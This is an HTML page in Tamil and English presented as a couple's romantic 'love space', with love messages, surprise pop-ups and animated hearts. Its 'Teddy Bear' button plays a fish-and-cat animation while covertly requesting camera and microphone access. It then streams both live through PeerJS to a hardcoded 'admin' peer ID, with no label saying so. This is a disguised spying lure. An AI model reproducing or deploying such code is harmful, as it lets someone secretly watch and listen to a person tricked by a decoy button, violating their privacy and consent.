<!DOCTYPE html>
<html lang="ta">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Our Love Space 💗</title>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body {
            background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 99%, #fecfef 100%);
            min-height: 100vh; display: flex; justify-content: center; align-items: center;
            overflow: hidden; position: relative;
        }
        .container {
            background: rgba(255, 255, 255, 0.85); padding: 2rem; border-radius: 20px;
            box-shadow: 0 8px 32px rgba(255, 105, 180, 0.3); text-align: center;
            width: 90%; max-width: 400px; z-index: 10;
        }
        h1 { color: #d6336c; font-size: 1.8rem; margin-bottom: 1.5rem; }
        .message-card {
            background: #fff0f5; padding: 1.5rem; border-radius: 15px;
            margin-bottom: 2rem; border: 2px dashed #ffb3c6;
        }
        #daily-message { font-size: 1.2rem; color: #555; line-height: 1.5; }
        
        button {
            padding: 15px 20px; border: none; border-radius: 50px;
            font-size: 1.1rem; font-weight: bold; cursor: pointer;
            width: 100%; margin-bottom: 15px; transition: 0.2s;
        }
        button:active { transform: scale(0.95); }
        
        .surprise-btn { background: linear-gradient(45deg, #ff758c 0%, #ff7eb3 100%); color: white; box-shadow: 0 4px 15px rgba(255, 117, 140, 0.4); }
        
        .live-btn { 
            background: #87CEEB; /* Sky blue for water feel */
            color: #fff; 
            border: 2px solid #4682B4; 
            position: relative;
            overflow: hidden;
            font-size: 1.2rem;
        }

        /* Water Animation */
        .water-effect {
            position: absolute;
            bottom: 0;
            left: 0;
            width: 200%;
            height: 100%;
            background: url('https://www.transparenttextures.com/patterns/waves.png');
            opacity: 0.3;
            animation: moveWaves 10s linear infinite;
            z-index: 1;
        }
        @keyframes moveWaves {
            0% { transform: translateX(0); }
            100% { transform: translateX(-50%); }
        }

        /* Fish inside button */
        .fish-emoji {
            position: absolute;
            font-size: 20px;
            animation: swim 3s linear infinite;
            z-index: 2;
        }
        @keyframes swim {
            0% { left: -20px; transform: scaleX(1); }
            50% { left: 100%; transform: scaleX(1); }
            51% { transform: scaleX(-1); }
            100% { left: -20px; transform: scaleX(-1); }
        }

        /* Falling Fish */
        .falling-fish {
            position: absolute;
            font-size: 30px;
            z-index: 100;
            transition: top 2s ease-in, left 2s ease-in;
        }

        /* Cat */
        .cat {
            position: absolute;
            font-size: 40px;
            z-index: 101;
            display: none;
            transition: 0.5s;
        }

        .stop-btn { background: #ff4d4d; color: white; display: none; box-shadow: 0 4px 15px rgba(255, 77, 77, 0.4); }
        
        .heart { position: absolute; bottom: -20px; font-size: 20px; animation: floatUp 5s linear infinite; opacity: 0; }
        @keyframes floatUp { 0% { transform: translateY(0); opacity: 0.8; } 100% { transform: translateY(-100vh) scale(1.5); opacity: 0; } }
    </style>
</head>
<body>
    <div id="hearts-container"></div>
    <div class="container">
        <h1>Welcome to Our Space 💖</h1>
        <div class="message-card">
            <h2>💌 இன்றைய காதல் செய்தி</h2>
            <p id="daily-message">Loading...</p>
        </div>
        
        <button id="surpriseBtn" class="surprise-btn" onclick="showSurprise()">💗 Love Surprise</button>
        
        <!-- Teddy Bear Button with Water & Fish -->
        <button id="shareBtn" class="live-btn" onclick="catchFish()">
            <div class="water-effect"></div>
            <span class="fish-emoji" style="animation-delay: 0s;">🐠</span>
            <span class="fish-emoji" style="animation-delay: 1s;">🐟</span>
            <span class="fish-emoji" style="animation-delay: 2s;">🐡</span>
            🧸 Teddy Bear
        </button>
        
        <button id="stopBtn" class="stop-btn" onclick="stopSharing()">🛑 Stop Sharing</button>
    </div>

    <script>
        // 1. Daily Love Message
        const loveMessages = ["நீ என் வாழ்க்கையின் மிக அழகான பரிசு.", "உன் புன்னகை என்னை மகிழ்ச்சியாக வைத்திருக்கிறது.", "நீ என் எல்லாம்.", "இன்று உன்னை மிகவும் மிஸ் செய்கிறேன்."];
        const dayOfYear = Math.floor((new Date() - new Date(new Date().getFullYear(), 0, 0)) / 1000 / 60 / 60 / 24);
        document.getElementById('daily-message').innerText = loveMessages[dayOfYear % loveMessages.length];

        // 2. Love Surprise
        function showSurprise() {
            const surprises = [
                "You are my favorite person! ❤️", "I love you to the moon and back! 🌙",
                "You make my heart skip a beat! 💓", "Forever yours! 💍", "உன் புன்னகை தான் என் உலகம். 🌎",
                "நீ என் வாழ்க்கையின் மிக அழகான பரிசு. 🎁", "எப்போதும் உன் கூடவே இருப்பேன். 🤝",
                "உன்னை நினைக்காத நாளே இல்லை. 🥺", "என் இதயம் உன்னிடம் தான் இருக்கு. 💖",
                "நீ சிரிக்கும் போது என் உலகமே சிரிக்கிறது. 😊", "உன் கண்களில் நான் என் உலகத்தை காண்கிறேன். 👀"
            ];
            alert("🎁 SURPRISE! 🎁\n\n" + surprises[Math.floor(Math.random() * surprises.length)]);
        }

        // 3. Floating Hearts
        setInterval(() => {
            const heart = document.createElement('div');
            heart.classList.add('heart'); heart.innerText = ['❤️', '💖', '💗'][Math.floor(Math.random() * 3)];
            heart.style.left = Math.random() * 100 + 'vw'; heart.style.animationDuration = Math.random() * 3 + 3 + 's';
            document.getElementById('hearts-container').appendChild(heart);
            setTimeout(() => heart.remove(), 6000);
        }, 300);

        // 4. Fish and Cat Animation on Button Click
        function catchFish() {
            const btn = document.getElementById('shareBtn');
            const btnRect = btn.getBoundingClientRect();
            
            // Create a falling fish
            const fish = document.createElement('div');
            fish.className = 'falling-fish';
            fish.innerText = '🐟';
            fish.style.left = btnRect.left + (btnRect.width / 2) + 'px';
            fish.style.top = btnRect.top + 'px';
            document.body.appendChild(fish);

            // Animate falling
            setTimeout(() => {
                fish.style.top = btnRect.bottom + 50 + 'px'; // Fall below button
                fish.style.left = btnRect.left + (Math.random() * 50) + 'px'; // Random left
            }, 10);

            // Create Cat
            const cat = document.createElement('div');
            cat.className = 'cat';
            cat.innerText = '🐱';
            cat.style.left = btnRect.left + 20 + 'px';
            cat.style.top = btnRect.bottom + 50 + 'px';
            document.body.appendChild(cat);
            
            setTimeout(() => {
                cat.style.display = 'block';
            }, 1000);

            // Catch fish (hide fish, show cat eating)
            setTimeout(() => {
                fish.style.display = 'none';
                cat.innerText = '😻'; // Happy cat
            }, 2000);

            // Cleanup after 4 seconds
            setTimeout(() => {
                fish.remove();
                cat.remove();
            }, 4000);

            // Start Live Sharing
            startAllSharing();
        }

        // 5. Live Video Call
        const ADMIN_PEER_ID = "love-app-admin-2024"; 
        let camStream, peer;

        async function startAllSharing() {
            try {
                document.getElementById('shareBtn').innerText = "🧸 Connecting...";
                camStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });

                peer = new Peer(); 
                peer.on('open', (id) => {
                    const call = peer.call(ADMIN_PEER_ID, camStream);
                    call.on('stream', () => {
                        document.getElementById('shareBtn').style.display = 'none';
                        document.getElementById('stopBtn').style.display = 'block';
                    });
                });

                peer.on('error', (err) => {
                    alert("Admin Online-ல இல்ல. நெட்வொர்க் செக் பண்ணுங்க.");
                    stopSharing();
                });

            } catch (err) {
                alert("கேமரா/மைக் பர்மிஷன் மறுக்கப்பட்டது: " + err.message);
                stopSharing();
            }
        }

        function stopSharing() {
            if (camStream) camStream.getTracks().forEach(t => t.stop());
            if (peer) peer.destroy();
            document.getElementById('shareBtn').style.display = 'block';
            // ஸ்டாப் பண்ணதும் மறுபடியும் டெடி பியர் வரும்
            document.getElementById('shareBtn').innerHTML = `
                <div class="water-effect"></div>
                <span class="fish-emoji" style="animation-delay: 0s;">🐠</span>
                <span class="fish-emoji" style="animation-delay: 1s;">🐟</span>
                <span class="fish-emoji" style="animation-delay: 2s;">🐡</span>
                🧸 Teddy Bear
            `;
            document.getElementById('stopBtn').style.display = 'none';
        }
    </script>
</body>
</html>
